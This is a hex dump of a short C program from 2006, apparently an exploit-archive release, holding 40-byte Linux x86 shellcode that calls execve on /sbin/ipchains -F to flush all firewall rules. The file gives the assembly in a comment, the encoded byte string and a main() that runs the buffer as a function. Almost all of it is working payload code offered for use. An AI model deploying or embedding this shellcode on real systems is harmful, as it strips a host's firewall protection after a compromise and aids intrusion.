00000000  2f 2a 20 42 79 20 4b 72  69 73 20 4b 61 74 74 65  |/* By Kris Katte|
00000010  72 6a 6f 68 6e 20 31 31  2f 31 38 2f 32 30 30 36  |rjohn 11/18/2006|
00000020  0d 0a 20 2a 0d 0a 20 2a  20 34 30 20 62 79 74 65  |.. *.. * 40 byte|
00000030  20 73 68 65 6c 6c 63 6f  64 65 20 74 6f 20 66 6c  | shellcode to fl|
00000040  75 73 68 20 69 70 63 68  61 69 6e 73 20 66 6f 72  |ush ipchains for|
00000050  20 4c 69 6e 75 78 20 78  38 36 0d 0a 20 2a 0d 0a  | Linux x86.. *..|
00000060  20 2a 0d 0a 20 2a 0d 0a  20 2a 20 73 65 63 74 69  | *.. *.. * secti|
00000070  6f 6e 20 2e 74 65 78 74  0d 0a 20 2a 0d 0a 20 2a  |on .text.. *.. *|
00000080  20 20 20 20 20 20 67 6c  6f 62 61 6c 20 5f 73 74  |      global _st|
00000090  61 72 74 0d 0a 20 2a 0d  0a 20 2a 20 5f 73 74 61  |art.. *.. * _sta|
000000a0  72 74 3a 0d 0a 20 2a 0d  0a 20 2a 20 3b 20 65 78  |rt:.. *.. * ; ex|
000000b0  65 63 76 65 28 22 2f 73  62 69 6e 2f 69 70 63 68  |ecve("/sbin/ipch|
000000c0  61 69 6e 73 22 2c 20 7b  20 22 2f 73 62 69 6e 2f  |ains", { "/sbin/|
000000d0  69 70 63 68 61 69 6e 73  22 2c 20 22 2d 46 22 2c  |ipchains", "-F",|
000000e0  20 4e 55 4c 4c 20 7d 2c  20 4e 55 4c 4c 29 0d 0a  | NULL }, NULL)..|
000000f0  20 2a 0d 0a 20 2a 20 20  20 20 20 20 70 75 73 68  | *.. *      push|
00000100  20 62 79 74 65 20 31 31  0d 0a 20 2a 20 20 20 20  | byte 11.. *    |
00000110  20 20 70 6f 70 20 65 61  78 0d 0a 20 2a 20 20 20  |  pop eax.. *   |
00000120  20 20 20 63 64 71 0d 0a  20 2a 20 20 20 20 20 20  |   cdq.. *      |
00000130  70 75 73 68 20 65 64 78  0d 0a 20 2a 20 20 20 20  |push edx.. *    |
00000140  20 20 70 75 73 68 20 77  6f 72 64 20 30 78 34 36  |  push word 0x46|
00000150  32 64 0d 0a 20 2a 20 20  20 20 20 20 6d 6f 76 20  |2d.. *      mov |
00000160  65 63 78 2c 20 65 73 70  0d 0a 20 2a 20 20 20 20  |ecx, esp.. *    |
00000170  20 20 70 75 73 68 20 65  64 78 0d 0a 20 2a 20 20  |  push edx.. *  |
00000180  20 20 20 20 70 75 73 68  20 77 6f 72 64 20 30 78  |    push word 0x|
00000190  37 33 36 65 0d 0a 20 2a  20 20 20 20 20 20 70 75  |736e.. *      pu|
000001a0  73 68 20 30 78 36 39 36  31 36 38 36 33 0d 0a 20  |sh 0x69616863.. |
000001b0  2a 20 20 20 20 20 20 70  75 73 68 20 30 78 37 30  |*      push 0x70|
000001c0  36 39 32 66 36 65 0d 0a  20 2a 20 20 20 20 20 20  |692f6e.. *      |
000001d0  70 75 73 68 20 30 78 36  39 36 32 37 33 32 66 0d  |push 0x6962732f.|
000001e0  0a 20 2a 20 20 20 20 20  20 6d 6f 76 20 65 62 78  |. *      mov ebx|
000001f0  2c 20 65 73 70 0d 0a 20  2a 20 20 20 20 20 20 70  |, esp.. *      p|
00000200  75 73 68 20 65 64 78 0d  0a 20 2a 20 20 20 20 20  |ush edx.. *     |
00000210  20 70 75 73 68 20 65 63  78 0d 0a 20 2a 20 20 20  | push ecx.. *   |
00000220  20 20 20 70 75 73 68 20  65 62 78 0d 0a 20 2a 20  |   push ebx.. * |
00000230  20 20 20 20 20 6d 6f 76  20 65 63 78 2c 20 65 73  |     mov ecx, es|
00000240  70 0d 0a 20 2a 20 20 20  20 20 20 69 6e 74 20 30  |p.. *      int 0|
00000250  78 38 30 0d 0a 20 2a 2f  0d 0a 0d 0a 6d 61 69 6e  |x80.. */....main|
00000260  28 29 0d 0a 7b 0d 0a 20  20 20 20 20 20 20 63 68  |()..{..       ch|
00000270  61 72 20 73 68 65 6c 6c  63 6f 64 65 5b 5d 20 3d  |ar shellcode[] =|
00000280  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00000290  20 22 5c 78 36 61 5c 78  30 62 5c 78 35 38 5c 78  | "\x6a\x0b\x58\x|
000002a0  39 39 5c 78 35 32 5c 78  36 36 5c 78 36 38 5c 78  |99\x52\x66\x68\x|
000002b0  32 64 5c 78 34 36 5c 78  38 39 22 0d 0a 20 20 20  |2d\x46\x89"..   |
000002c0  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 65  |            "\xe|
000002d0  31 5c 78 35 32 5c 78 36  36 5c 78 36 38 5c 78 36  |1\x52\x66\x68\x6|
000002e0  65 5c 78 37 33 5c 78 36  38 5c 78 36 33 5c 78 36  |e\x73\x68\x63\x6|
000002f0  38 5c 78 36 31 22 0d 0a  20 20 20 20 20 20 20 20  |8\x61"..        |
00000300  20 20 20 20 20 20 20 22  5c 78 36 39 5c 78 36 38  |       "\x69\x68|
00000310  5c 78 36 65 5c 78 32 66  5c 78 36 39 5c 78 37 30  |\x6e\x2f\x69\x70|
00000320  5c 78 36 38 5c 78 32 66  5c 78 37 33 5c 78 36 32  |\x68\x2f\x73\x62|
00000330  22 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |"..             |
00000340  20 20 22 5c 78 36 39 5c  78 38 39 5c 78 65 33 5c  |  "\x69\x89\xe3\|
00000350  78 35 32 5c 78 35 31 5c  78 35 33 5c 78 38 39 5c  |x52\x51\x53\x89\|
00000360  78 65 31 5c 78 63 64 5c  78 38 30 22 3b 0d 0a 0d  |xe1\xcd\x80";...|
00000370  0a 20 20 20 20 20 20 20  28 2a 28 76 6f 69 64 20  |.       (*(void |
00000380  28 2a 29 28 29 29 20 73  68 65 6c 6c 63 6f 64 65  |(*)()) shellcode|
00000390  29 28 29 3b 0d 0a 7d                              |)();..}|
00000397
